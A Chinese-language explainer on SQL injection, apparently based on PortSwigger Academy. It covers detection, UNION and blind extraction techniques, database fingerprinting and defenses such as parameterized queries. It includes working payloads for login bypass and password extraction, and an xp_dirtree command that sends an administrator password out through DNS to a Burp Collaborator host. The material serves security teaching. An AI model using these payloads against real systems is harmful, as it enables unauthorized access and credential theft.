# SQL Injection (SQLi) — 漏洞深度剖析

## 概述

SQL injection (SQLi) 是一种允许攻击者干扰应用程序向数据库发出的查询的 Web 安全漏洞。攻击者可以借此查看正常情况下无法检索的数据——可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。在许多情况下，攻击者可以修改或删除这些数据，导致应用程序的内容或行为发生持久性变更。在某些场景下，攻击者可以将 SQL 注入升级为对底层服务器或后端基础设施的完全控制，甚至发起拒绝服务攻击。

SQL 注入已导致多起广为报道的重大数据泄露事件，造成声誉损害和监管罚款。部分案例中，攻击者获取了组织系统的持久后门，导致长期隐蔽的持续入侵。

---

## 根本原因

SQL 注入的**根本原因**是应用程序将用户输入与 SQL 查询逻辑混为一谈。当开发者使用字符串拼接构造 SQL 语句时，用户输入的语法元素（如单引号 `'`、注释符 `--`、关键字 `OR`）可以修改原始查询的语义结构。这不是 SQL 语言本身的缺陷，而是**数据与指令边界模糊**导致的经典注入问题。

从更底层的角度分析，SQL 注入的存在需要三个条件同时满足：

1. **应用程序将用户输入嵌入 SQL 查询** — 输入成为查询字符串的一部分
2. **输入未经充分转义或过滤** — 恶意字符得以保留其在 SQL 中的语法含义
3. **数据库以应用身份执行查询** — 权限边界与业务逻辑未隔离

---

## 触发条件与注入位置

### 注入位置

SQL 注入不仅存在于 `SELECT` 的 `WHERE` 子句中，以下位置同样可能出现：

- `UPDATE` 语句中的更新值或 `WHERE` 子句
- `INSERT` 语句中的插入值
- `SELECT` 语句中的表名或列名
- `SELECT` 语句中的 `ORDER BY` 子句
- Cookie、Header、JSON/XML 请求体等所有可控输入

### 检测方法

人工检测 SQL 注入的系统性方法是通过每个输入点提交以下五类 payload 并观察应用响应差异：

| 测试类型 | Payload 示例 | 观测指标 |
|---------|-------------|---------|
| **引号/语法字符** | `'` | 是否触发错误或其他异常 |
| **等价语法** | 使条件回到原值的 SQL 语法 | 响应是否与原始请求一致 |
| **布尔条件** | `OR 1=1` vs `OR 1=2` | 响应是否有系统性差异 |
| **时间延迟** | 数据库特定的 sleep/wait 函数 | 响应时间为差异 |
| **带外交互 (OAST)** | 触发 DNS/HTTP 请求的 payload | 外部服务器是否收到回调 |

---

## 攻击变体

### 1. 检索隐藏数据 (Retrieving Hidden Data)

**利用场景**：查询结果被额外条件限制（如 `released=1`），攻击者通过注释或 `OR` 条件绕过。

**原始查询**：
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**攻击示例 — URL 参数注入**:
```
https://insecure-website.com/products?category=Gifts'--
```

**注入后实际执行的 SQL**:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

`--` 是 SQL 注释指示符。剩余部分 `AND released = 1` 被注释掉，所有产品（包括未发布的）均被返回。

**扩展到任意类别的所有产品**:
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

注入后：
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

由于 `1=1` 始终为真，查询返回所有产品。

> 警告：注入 `OR 1=1` 需谨慎。即使在该上下文中无害，应用程序可能在多个查询中复用同一输入数据。如果该条件到达 `UPDATE` 或 `DELETE` 语句，可能导致数据意外丢失。

### 2. 颠覆应用逻辑 (Subverting Application Logic)

**利用场景**：登录认证。攻击者通过注释移除密码校验，以任意用户身份登录。

**原始查询**：
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

**攻击 payload** — 用户名输入 `administrator'--`，密码留空：
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

密码检查部分被注释掉，查询返回 `administrator` 用户记录，攻击者成功以该用户身份登录。

### 3. UNION 攻击 (Retrieving Data from Other Tables)

**利用场景**：查询结果在应用响应中可观察。攻击者使用 `UNION` 关键字追加第二个 `SELECT` 查询，从一个或多个表中提取数据。

**原始查询**：
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

**攻击 payload**：
```
' UNION SELECT username, password FROM users--
```

注入后查询同时返回产品信息和用户凭据。

**UNION 攻击的技术步骤**：

1. **确定列数** — 两种方法：
   - `ORDER BY` 递增法：`' ORDER BY 1--`、`' ORDER BY 2--`...直到报错
   - `UNION SELECT NULL` 法：`' UNION SELECT NULL--`、`' UNION SELECT NULL,NULL--`...直到不报错
   
   使用 `NULL` 的原因：`NULL` 可转换为所有常见数据类型，最大化兼容性

2. **确定字符串列** — 提交一系列 `UNION SELECT` payload，在各列位置依次放置字符串值 `'a'`：
   ```
   ' UNION SELECT 'a',NULL,NULL,NULL--
   ' UNION SELECT NULL,'a',NULL,NULL--
   ```
   不报错且响应中出现 `a` 的列即为字符串兼容列

3. **提取数据**：
   ```
   ' UNION SELECT username, password FROM users--
   ```

4. **单列多值提取**（仅一列可用时）— 使用字符串拼接：
   - Oracle: `' UNION SELECT username || '~' || password FROM users--`
   - MySQL: `' UNION SELECT CONCAT(username, '~', password) FROM users--`

**数据库特定差异**：

| 特性 | Oracle | MySQL | MSSQL/PostgreSQL |
|------|--------|-------|-----------------|
| FROM 子句必需 | 是 — 使用 `FROM dual` | 否 | 否 |
| 注释符 | `--` | `-- ` (空格) 或 `#` | `--` |
| 字符串拼接 | `\|\|` | `CONCAT()` 或空格 | `+` (MSSQL) / `\|\|` (PG) |

### 4. 盲 SQL 注入 (Blind SQL Injection)

当应用不返回查询结果或数据库错误详情时，利用仍可进行，但需要使用间接推断技术。

#### 4a. 基于布尔条件的条件响应 (Conditional Responses)

**前提**：应用程序行为因查询是否返回数据而有差异（如 "Welcome back" 消息）。

**工作机制**：注入布尔条件，通过响应差异逐位推断数据。

```
Cookie: TrackingId=xyz' AND '1'='1   → 返回 "Welcome back"（条件为真）
Cookie: TrackingId=xyz' AND '1'='2   → 无 "Welcome back"（条件为假）
```

利用此差异逐字符提取密码：
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm   → true
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't   → false
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's   → true
```
第一个字符确定为 `s`，以此类推。

#### 4b. 基于条件错误 (Conditional Errors)

**前提**：布尔条件注入无效（响应无差异），但数据库错误会导致响应差异。

**工作机制**：使用 `CASE WHEN` 在条件为真时触发数据库错误（如除零）：

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   → 无错误（条件为假）
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   → 错误（条件为真）
```

**完整数据提取 payload**：
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

#### 4c. 详细错误消息泄露 (Verbose Error Messages)

**工作机制**：数据库配置错误导致详细错误信息暴露出查询的实际数据。使用 `CAST()` 将字符串数据强制转换为不兼容类型：

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

错误回报类似：`ERROR: invalid input syntax for type integer: "Example data"`——数据直接出现在错误消息中，实现了从盲注到可见注入的转换。

#### 4d. 基于时间延迟 (Time Delays)

**适用场景**：应用捕获并优雅处理数据库错误，条件响应和条件错误方法均无效。

**工作机制**：SQL 查询通常是同步处理的，延迟查询执行会同步延迟 HTTP 响应。

按数据库类型区分：
```
MSSQL:     '; IF (1=2) WAITFOR DELAY '0:0:10'--     → 无延迟
MSSQL:     '; IF (1=1) WAITFOR DELAY '0:0:10'--     → 延迟 10 秒
MySQL:     ' AND IF(1=2, SLEEP(10), 0)--             → 无延迟
PostgreSQL:' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
Oracle:    ' AND (SELECT CASE WHEN (1=2) THEN DBMS_LOCK.SLEEP(10) ELSE 0 END FROM dual)--
```

**完整数据提取** (MSSQL)：
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

#### 4e. 带外 (OAST) 数据外带

**适用场景**：SQL 查询异步执行（在独立线程中），响应不依赖查询结果、错误或时间。

**工作机制**：触发数据库向攻击者控制的服务器发起 DNS/HTTP 请求，将数据编码到请求中。

**为什么 OAST 是盲注中最强的技术**：
- DNS 协议通常是生产网络中允许自由流通的（DNS 是基础服务）
- 可以**直接**将数据外带，而非逐字符推断
- 比时间盲注快几个数量级

**MSSQL 触发 DNS 查询示例**：
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

**完整数据外带**（将管理员密码编码到 DNS 子域名中）：
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

DNS 查询日志显示：`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`——密码直接出现在域名前缀中。

### 5. 二阶 SQL 注入 (Second-Order SQL Injection)

**一阶注入**：应用程序在接收 HTTP 请求时直接将用户输入不安全地嵌入 SQL 查询。

**二阶注入**：应用程序先安全地将用户输入存储到数据库（此时无注入），随后在另一个 HTTP 请求中取出存储的数据，并**不安全地**将其嵌入 SQL 查询。

**根本原因**：开发者对"数据库中的数据"赋予不合理的信任。首次存储时做了参数化处理所以安全，第二次使用时由于数据来自"可信源"（自己的数据库）而放松了警惕，直接拼接。这是一种**信任边界错位**。

### 6. 不同上下文中的 SQL 注入

SQL 注入可利用任何被应用作为 SQL 查询处理的可控输入——不限于 URL 查询字符串。JSON、XML 等格式的请求体同样可能。不同格式提供了不同的混淆途径，可绕过 WAF 等防御：

**XML 编码绕过示例** — 利用 XML 转义序列 (`&#x53;`) 编码 `S` 字符：
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

XML 转义序列在服务器端解码后再传给 SQL 解释器，绕过了检查原始关键词的过滤规则。

---

## 数据库信息收集

利用 SQL 注入时通常需要了解数据库结构。四步法：

### 1. 判断数据库类型和版本

| 数据库 | 版本查询 |
|--------|---------|
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

通过 `UNION` 注入：
```
' UNION SELECT @@version--
```

### 2. 列出数据库内容

**非 Oracle 数据库**（使用 information_schema）：
```sql
-- 列出表
SELECT * FROM information_schema.tables

-- 列出指定表的列
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

**Oracle 数据库**（使用 all_* 视图）：
```sql
-- 列出表
SELECT * FROM all_tables

-- 列出指定表的列
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

### 3. 跨数据库特性差异速查

| 特性 | MySQL | MSSQL | Oracle | PostgreSQL |
|------|-------|-------|--------|------------|
| 字符串拼接 | `CONCAT(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
| 注释 | `-- ` / `#` | `--` | `--` | `--` |
| 堆叠查询 | 取决于驱动 | `;` | `;` 需 `BEGIN` | `;` |
| 时间延迟 | `SLEEP(n)` | `WAITFOR DELAY` | `DBMS_LOCK.SLEEP(n)` | `pg_sleep(n)` |

---

## 防御方案

### 1. 参数化查询 / Prepared Statements（根本性修复）

参数化查询将 SQL 结构与用户数据分离，确保用户输入永远不会干扰查询语义：

```java
// 不安全（字符串拼接）
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

// 安全（参数化查询）
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

**关键约束**：参数化查询的有效性要求查询字符串始终是硬编码常量。不得依据任何运行时变量的内容决定是否使用字符串拼接——即使是"看起来可信"的数据。数据来源可能被其他代码变更无意中污染。

### 2. 参数化查询无法覆盖的场景

参数化查询不适用于以下 SQL 部分：
- 表名或列名
- `ORDER BY` 子句

对这类场景需采用：
- **白名单校验**：仅允许预定义的合法值
- **不同的逻辑路径**：用条件分支而非直接的字符串拼接

### 3. 纵深防御补充措施

- 遵循数据库账户最小权限原则（应用账户通常只需 `SELECT`/`INSERT`/`UPDATE`，不应有 `DROP`/`ALTER`/`FILE`）
- 禁用详细数据库错误信息直接回显到前端
- WAF 作为额外防线（但不能替代参数化查询）

### 4. 盲注的防御

防止盲 SQL 注入的措施与常规 SQL 注入完全相同。参数化查询能确保所有形式的 SQL 注入——无论带内还是带外——都无法利用，因为它从根本上去除了用户输入影响查询结构的可能性。

---

## 盲注技术能力递进总结

盲 SQL 注入的技术选择取决于应用程序对查询结果和错误的处理方式，按适用条件递进：

| 技术 | 前提条件 | 效率 |
|------|---------|------|
| 条件布尔响应 | 应用根据查询结果改变行为 | 逐字符（二分查找可加速） |
| 条件错误 | 应用行为不变但数据库错误产生差异 | 逐字符 |
| 详细错误消息 | 错误消息包含查询数据 | 直接获取（最优） |
| 时间延迟 | 无任何可观察差异但有同步响应 | 逐字符（最慢） |
| OAST 带外 | 异步查询 + 数据库有网络出站能力 | 直接外带数据（最快） |

> OAST 技术因其高成功率和直接外带数据的能力，即使在其他盲注技术也可行时，仍往往是更优选择。

---

> **文档类型**：漏洞分析文档
> **关联概念**：[[Blind SQL injection]], [[SQL injection cheat sheet]], [[Cross-site scripting (XSS)]], [[Server-Side Template Injection (SSTI)]]
> **参考来源**：PortSwigger Academy: SQL injection, OWASP Top 10 (2021): A03 Injection, CWE-89: SQL Injection
